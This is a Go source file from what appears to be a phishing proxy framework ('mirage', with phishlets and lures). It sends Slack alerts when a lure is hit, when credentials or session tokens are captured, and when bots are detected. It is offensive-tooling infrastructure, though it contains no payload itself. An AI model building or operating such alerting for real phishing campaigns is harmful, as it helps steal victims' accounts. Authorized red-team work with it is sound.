package notify

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/travisbale/mirage/sdk"
)

// SlackChannel delivers notifications as Slack Block Kit messages.
// Sensitive data (passwords, cookie values, token values) is redacted.
type SlackChannel struct {
	webhookURL string
	client     *http.Client
}

func NewSlackChannel(webhookURL string) *SlackChannel {
	return &SlackChannel{
		webhookURL: webhookURL,
		client:     &http.Client{Timeout: 10 * time.Second},
	}
}

func (s *SlackChannel) Name() string { return "slack" }

func (s *SlackChannel) Send(ctx context.Context, notification Notification) error {
	message := s.buildMessage(notification)

	body, err := json.Marshal(message)
	if err != nil {
		return fmt.Errorf("marshaling slack message: %w", err)
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, s.webhookURL, bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("creating request: %w", err)
	}
	req.Header.Set("Content-Type", "application/json")

	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	_, _ = io.Copy(io.Discard, resp.Body)

	if resp.StatusCode >= 400 {
		return &httpError{StatusCode: resp.StatusCode}
	}
	return nil
}

// slackMessage is the payload format for Slack incoming webhooks with Block Kit.
type slackMessage struct {
	Text   string       `json:"text"` // fallback for notifications
	Blocks []slackBlock `json:"blocks,omitempty"`
}

type slackBlock struct {
	Type   string      `json:"type"`
	Text   *slackText  `json:"text,omitempty"`
	Fields []slackText `json:"fields,omitempty"`
}

type slackText struct {
	Type string `json:"type"` // "mrkdwn" or "plain_text"
	Text string `json:"text"`
}

// newBlockMessage builds a Slack Block Kit message with a header section and fields section.
func newBlockMessage(header, fallback string, fields []slackText) slackMessage {
	return slackMessage{
		Text: fallback,
		Blocks: []slackBlock{
			{Type: "section", Text: &slackText{Type: "mrkdwn", Text: header}},
			{Type: "section", Fields: fields},
		},
	}
}

func field(label, value string) slackText {
	return slackText{Type: "mrkdwn", Text: fmt.Sprintf("*%s*\n%s", label, value)}
}

func (s *SlackChannel) buildMessage(notification Notification) slackMessage {
	switch notification.Event {
	case sdk.EventSessionCreated:
		return s.buildSessionCreated(notification)
	case sdk.EventCredsCaptured:
		return s.buildCredsCaptured(notification)
	case sdk.EventTokensCaptured:
		return s.buildTokensCaptured(notification)
	case sdk.EventSessionCompleted:
		return s.buildSessionCompleted(notification)
	case sdk.EventBotDetected:
		return s.buildBotDetected(notification)
	case sdk.EventDNSRecordSynced:
		return s.buildDNSSynced(notification)
	case sdk.EventPhishletEnabled, sdk.EventPhishletReloaded:
		return s.buildPhishletEvent(notification)
	default:
		return slackMessage{Text: fmt.Sprintf("Mirage event: %s", notification.Event)}
	}
}

func (s *SlackChannel) buildSessionCreated(notification Notification) slackMessage {
	session := notification.Session
	if session == nil {
		return slackMessage{Text: ":fishing_pole_and_fish: Lure Hit"}
	}
	return newBlockMessage(
		":fishing_pole_and_fish: *Lure Hit*",
		"Lure Hit — "+session.Phishlet,
		[]slackText{
			field("Phishlet", session.Phishlet),
			field("Remote IP", session.RemoteAddr),
			field("User Agent", truncate(session.UserAgent, 100)),
			field("Session", session.ID),
		},
	)
}

func (s *SlackChannel) buildCredsCaptured(notification Notification) slackMessage {
	session := notification.Session
	if session == nil {
		return slackMessage{Text: ":key: Credentials Captured"}
	}
	return newBlockMessage(
		":key: *Credentials Captured*",
		"Credentials Captured — "+session.Username,
		[]slackText{
			field("Phishlet", session.Phishlet),
			field("Username", session.Username),
			field("Session", session.ID),
		},
	)
}

func (s *SlackChannel) buildTokensCaptured(notification Notification) slackMessage {
	session := notification.Session
	if session == nil {
		return slackMessage{Text: ":cookie: Tokens Captured"}
	}
	return newBlockMessage(
		":cookie: *Tokens Captured*",
		"Tokens Captured — "+session.Phishlet,
		[]slackText{
			field("Phishlet", session.Phishlet),
			field("Tokens", fmt.Sprintf("%d captured", countTokens(session))),
			field("Session", session.ID),
		},
	)
}

func (s *SlackChannel) buildSessionCompleted(notification Notification) slackMessage {
	session := notification.Session
	if session == nil {
		return slackMessage{Text: ":white_check_mark: Session Complete"}
	}
	return newBlockMessage(
		":white_check_mark: *Session Complete*",
		"Session Complete — "+session.Username,
		[]slackText{
			field("Phishlet", session.Phishlet),
			field("Username", session.Username),
			field("Tokens", fmt.Sprintf("%d captured", countTokens(session))),
			field("Session", session.ID),
		},
	)
}

func (s *SlackChannel) buildBotDetected(notification Notification) slackMessage {
	bot := notification.Bot
	if bot == nil {
		return slackMessage{Text: ":robot_face: Bot Detected"}
	}
	return newBlockMessage(
		":robot_face: *Bot Detected*",
		"Bot Detected — "+bot.Verdict,
		[]slackText{
			field("Verdict", bot.Verdict),
			field("Score", fmt.Sprintf("%.2f", bot.BotScore)),
			field("Remote IP", bot.RemoteAddr),
			field("Reason", bot.Reason),
		},
	)
}

func (s *SlackChannel) buildDNSSynced(notification Notification) slackMessage {
	dns := notification.DNS
	if dns == nil {
		return slackMessage{Text: ":globe_with_meridians: DNS Record Synced"}
	}
	action := dns.Action
	if len(action) > 0 {
		action = strings.ToUpper(action[:1]) + action[1:]
	}
	return newBlockMessage(
		fmt.Sprintf(":globe_with_meridians: *DNS Record %s*", action),
		fmt.Sprintf("DNS Record %s — %s", action, dns.Name),
		[]slackText{
			field("Zone", dns.Zone),
			field("Record", dns.Name+" "+dns.Type),
			field("Provider", dns.Provider),
		},
	)
}

func (s *SlackChannel) buildPhishletEvent(notification Notification) slackMessage {
	verb := "Enabled"
	if notification.Event == sdk.EventPhishletReloaded {
		verb = "Reloaded"
	}
	return newBlockMessage(
		fmt.Sprintf(":gear: *Phishlet %s*", verb),
		fmt.Sprintf("Phishlet %s — %s", verb, notification.Phishlet),
		[]slackText{
			field("Name", notification.Phishlet),
		},
	)
}

func countTokens(session *SessionData) int {
	count := 0
	for _, byName := range session.CookieTokens {
		count += len(byName)
	}
	count += len(session.BodyTokens)
	count += len(session.HTTPTokens)
	return count
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
